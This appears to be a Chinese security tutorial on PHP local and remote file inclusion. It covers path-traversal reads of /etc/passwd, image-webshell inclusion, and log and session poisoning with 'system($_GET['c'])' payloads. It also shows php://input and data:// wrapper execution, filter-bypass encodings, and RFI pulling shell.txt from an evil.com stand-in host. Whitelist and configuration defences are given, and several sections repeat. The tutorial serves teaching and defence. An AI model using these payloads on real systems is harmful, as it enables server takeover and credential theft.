---
title: 文件包含漏洞：把任意文件拉进来执行
description: 讲清本地文件包含(LFI)与远程文件包含(RFI)的原理与危害，覆盖包含图片马、PHP 伪协议、日志注入等利用，并给出禁用远程包含、白名单等防御。
category: security
subcategory: pentest
tags: ['文件包含', 'LFI', 'RFI', 'Web安全']
pubDate: 2026-07-18
order: 10
---

**文件包含（File Inclusion）** 漏洞出现在"网站用 `include` 把用户指定的文件拉进来"的场景。如果文件名用户可控，攻击就能让服务器去包含**任意文件**——包含配置文件就泄露密码，包含图片马就执行 PHP，包含远程 URL 就更危险。它和文件上传是"黄金搭档"。

> 以下仅在授权靶场（如 DVWA、pikachu）练习；对他人服务器利用文件包含属违法。

## 原理：include 把文件"拉进来"

很多框架用包含来复用代码：

```php
$page = $_GET['page'];
include($page . '.php');   // 期望 page=home → 包含 home.php
```

用户输入 `page=../../etc/passwd%00`，就变成 `include('../../etc/passwd')`，服务器把系统文件内容**读出来并显示**。若包含的是 PHP 文件，则**执行**它。

## LFI 与 RFI

- **LFI（本地文件包含）**：包含**服务器本地**的文件。能读敏感文件、配合图片马执行 PHP。
- **RFI（远程文件包含）**：包含**远程 URL** 的文件，如 `page=http://evil.com/shell.txt`。危害更大，等于直接拉攻击者脚本执行。RFI 需要 `allow_url_include=On`（现代 PHP 默认关），所以现在少见，但老系统仍有。

## LFI 利用：从读到执行

**1. 读取敏感文件（任意文件读取）**

```
?page=../../../../etc/passwd
?page=../../../../var/www/config.php
```

`../` 是"上一级目录"，一层层往上逃出 Web 根目录，读到系统或配置文件。Windows 用 `..\`。这本质是"目录穿越 + 文件读取"。

**2. 包含图片马执行 PHP**

配合上篇文件上传：你先传 `webshell.jpg`（图片马），再用 LFI 包含它：

```
?page=../uploads/webshell.jpg
```

服务器把 `webshell.jpg` 当 PHP 包含进来，**执行**了里面的 `<?php eval(...) ?>`。这就是上传+包含"黄金搭档"拿 shell 的完整链路。

**3. 日志注入（Log Poisoning）**

Web 服务器会把访问记录写进日志（如 `/var/log/apache2/access.log`），而日志里包含 `User-Agent` 等请求头。攻击者把 PHP 代码塞进 User-Agent：

```http
GET / HTTP/1.1
User-Agent: <?php phpinfo(); ?>
```

然后 LFI 包含这个日志文件：

```
?page=../../../../var/log/apache2/access.log
```

服务器执行了日志里的 PHP —— 因为日志本身被"毒化"了。同理可毒化 `/proc/self/environ` 等。

**4. PHP 伪协议（Wrapper）**

PHP 的 `include` 支持多种"伪协议"，开启 `allow_url_include` 时尤其强：

- `php://filter`：读取源码（编码后避免被执行，方便读源码）：

```
?page=php://filter/convert.base64-encode/resource=index
```

把 `index.php` 源码 base64 编码输出，你解码即得源码——用来审计找更多漏洞。

- `php://input`：把 POST 正文当 PHP 执行：

```
?page=php://input
POST 正文：<?php system('id'); ?>
```

- `data://`：`?page=data://text/plain,<?php phpinfo();?>` 直接执行。

这些伪协议是 LFI 升级成 RCE 的桥梁。

## RFI 利用

若 `allow_url_include=On`：

```
?page=http://evil.com/shell.txt
```

服务器直接拉远程 PHP 执行，无需先上传。危害极大但现代环境默认禁用，所以多见于老系统/CTF。

## 防御：包含什么要我说了算

**1. 白名单（最可靠）**

包含的文件只能是有限的几个页面，用映射而不是用户直传路径：

```php
$map = ['home'=>'home.php', 'about'=>'about.php'];
$page = $map[$_GET['page']] ?? 'home.php';
include($page);
```

用户只能传 `home`/`about` 这种"键"，实际文件名由代码定，**根本没法指定任意路径**。

**2. 禁用远程包含**

`php.ini`：`allow_url_include = Off`、`allow_url_fopen = Off`（按需）。关掉 RFI 和伪协议的大部分能力。

**3. 过滤目录穿越**

对用户输入做 `basename()`、过滤 `../`、`.`、空字节，限制只能在指定目录内。但过滤易被绕过，白名单更稳。

**4. 关闭危险伪协议**

生产环境不需要 `php://input`、`data://` 时，通过配置/代码禁用。

**5. 文件权限与 open_basedir**

用 `open_basedir` 限制 PHP 只能访问指定目录，即使有包含漏洞也读不到 `/etc/passwd`。


## 更多实战案例：本地与远程包含

**LFI（本地文件包含）**：页面用 `include($_GET['page'] . '.php')`，攻击者传 `?page=../../../../etc/passwd%00`（老 PHP 有空字节截断）或 `?page=php://filter/convert.base64-encode/resource=config` 把源码读成 base64。现代 PHP 关了空字节，但 `php://filter` 读源码依然有效。

**RFI（远程文件包含）**：若 `allow_url_include=On`，攻击者传 `?page=http://evil.com/shell.txt`，服务器把远程文件当代码执行，直接getshell。

**日志中毒**：LFI 只能读不能执行时，可往 `/var/log/apache2/access.log` 注入 `<?php system($_GET['c']);?>`（写在 User-Agent 里），再用 LFI 包含这个日志文件，让里面的 PHP 代码被执行——这就是"日志包含getshell"。

## 常见坑

1. **只过滤 `../`**：攻击者可混用 `..\/`、双重编码 `%2e%2e%2f`、或绝对路径绕过。
2. **以为读不到就没事**：能读 `php://filter` 源码就等于拿到数据库密码。
3. **白名单只比前缀**：`page=admin/../../etc/passwd` 可能绕过前缀白名单。
4. **忽视 session 文件**：`/var/lib/php/sessions/sess_xxx` 也能被包含利用。

## 进阶：修复

最稳的是**硬编码白名单**：`$allow = ['home','about']; if(!in_array($_GET['page'],$allow)) die;`；不要拼接路径，更不要让用户控制文件名。需要包含动态文件时，把"文件名→真实路径"的映射写在代码里。

## 小测验

- 问题1：读源码用哪个 php 伪协议？答案：`php://filter/convert.base64-encode/resource=`。
- 问题2：RFI 成立需要什么配置？答案：`allow_url_include=On`。
- 问题3：修复文件包含最稳方案？答案：硬编码白名单，不让用户控制路径。



## 更多实战案例：用 PHP 伪协议读源码与写 shell

LFI 不止能读 `/etc/passwd`。用 `php://filter/convert.base64-encode/resource=index` 可以把 `index.php` 的源码编码成 base64 回显，解码即得源码——这往往能拿到数据库配置、密钥、甚至其他漏洞点。若目标有文件上传且能被包含，先传一个内容是 `<?php system($_GET['c']);?>` 的图片，再用 LFI 包含这个图片路径，图片里的 PHP 就被执行，等于拿到命令执行（这就是"图片马 + 包含 = getshell"）。

## 更多实战案例：日志与 session 包含

Apache 的 `access.log` 会记录请求行和 User-Agent。把 `<?php system($_GET['c']);?>` 写在 User-Agent 里，日志里就存了一段 PHP 代码；再用 LFI 包含 `/var/log/apache2/access.log`，这段代码被执行，getshell。同理 PHP 的 session 文件 `/var/lib/php/sessions/sess_PHPSESSID` 里若存了用户可控的输入（如昵称），包含它也能触发代码执行。前提是路径已知且包含点可控。

## 更多实战案例：路径遍历的编码绕过

防御若只 `str_replace('../','')`，攻击者可写 `....//` 或 `..././` 让替换后重新拼出 `../`；用 URL 编码 `%2e%2e%2f`、双重编码 `%252e`、或 UTF-8 超长字符（`%c0%ae`）在某些旧系统能绕过。绝对路径 `../../../../etc/passwd` 也可能直接生效。所以"过滤字符"这条路永远补不全，白名单才是正解。

## 常见坑（补充）

1. **以为 LFI 只是读文件**：配合上传/日志/session 能升级为 RCE。
2. **过滤 `../` 用简单替换**：嵌套编码绕过，要用白名单。
3. **白名单只比前缀**：`page=admin/../../etc/passwd` 绕过前缀匹配。
4. **忽视包含点是否用户可控**：只要包含路径有用户成分就危险。

## 进阶（补充）：从 LFI 到 RCE 的清单

可尝试的路径：包含上传文件、包含日志、包含 session、包含 `/proc/self/environ`（含 User-Agent）、包含临时上传文件、配合 `php://input` 直接执行 POST 体。每一条都依赖特定配置，系统化试一遍，比碰运气强。

## 小测验（补充）

- 问题1：LFI 怎么升级成 RCE？答案：包含含 PHP 代码的文件（图片马/日志/session）。
- 问题2：过滤 ../ 为什么不够？答案：嵌套与编码绕过，应白名单。
- 问题3：php://filter 读源码得到的是？答案：base64 编码的源码，解码即得。



## 更多实战案例：包含临时文件与 /proc

PHP 上传的文件会先存为临时文件（如 `/tmp/phpXXXX`），若应用在文件落盘前有机会被包含，可利用条件竞争：一边不断上传含 PHP 代码的文件，一边不断请求包含该临时路径，抢在临时文件被删前包含执行。还有 `/proc/self/environ` 包含：环境变量里若含 User-Agent 等可控输入，包含它就能执行其中的 PHP 代码。这些是 LFI 升级 RCE 的进阶手法。

## 更多实战案例：包含远程与伪协议读源码

RFI 需 `allow_url_include=On`，直接 `?page=http://evil/shell.txt` getshell。LFI 用 `php://filter/convert.base64-encode/resource=` 读源码，解码拿数据库配置与潜在漏洞点。`data://` 伪协议也能直接执行 `data://text/plain,<?php system($_GET[c]);?>`（需 allow_url_include）。伪协议是 LFI 利用的瑞士军刀。

## 常见坑（再补充）

1. **以为 LFI 只是读文件**：配合上传/日志/session/临时文件能升级 RCE。
2. **过滤 ../ 用简单替换**：嵌套与编码绕过，要用白名单。
3. **白名单只比前缀**：`page=admin/../../etc/passwd` 绕过前缀匹配。
4. **忽视包含点是否用户可控**：只要包含路径有用户成分就危险。

## 进阶（再补充）：从 LFI 到 RCE 清单

可尝试：包含上传文件、包含日志、包含 session、包含 `/proc/self/environ`、包含临时上传文件、配合 `php://input` 执行 POST 体、RFI。每一条依赖特定配置，系统化试一遍。修复：硬编码白名单，不让用户控制路径；禁止远程包含；上传目录不可执行；重命名随机化。

## 小测验（再补充）

- 问题1：LFI 怎么升级成 RCE？答案：包含含 PHP 代码的文件（图片马/日志/session/临时文件）。
- 问题2：php://filter 读源码得到什么？答案：base64 编码源码，解码即得。
- 问题3：过滤 ../ 为什么不够？答案：嵌套与编码绕过，应白名单。


## 这一篇你该记住的

文件包含漏洞 = 用户控制 `include` 的文件名。LFI 包含本地文件（读 /etc/passwd、配合图片马执行 PHP、日志注入毒化 access.log、php://filter 读源码）；RFI 包含远程 URL（需 allow_url_include）。防御核心是白名单映射（用户传键不传路径）、禁用远程包含、过滤穿越、open_basedir 限制。

上传+包含讲完，下一篇 **XXE** 转向 XML：当应用解析你提交的 XML 且允许外部实体，你就能读服务器文件、探内网。
